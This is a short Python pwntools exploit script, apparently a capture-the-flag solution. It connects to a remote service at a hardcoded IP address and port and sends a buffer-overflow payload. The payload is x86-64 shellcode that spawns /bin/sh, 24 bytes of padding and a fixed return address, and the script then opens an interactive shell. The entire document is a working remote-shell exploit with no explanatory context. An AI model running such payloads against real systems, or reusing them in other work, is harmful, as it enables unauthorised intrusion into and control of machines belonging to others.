from pwn import *

# conn = process('./scode')
conn = remote('130.192.5.212', 1952)
conn.recvuntil(b'place...', drop=True)


payload = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
payload += b'A'*24
payload += p64(0x00404080)


conn.sendline(payload)
conn.interactive()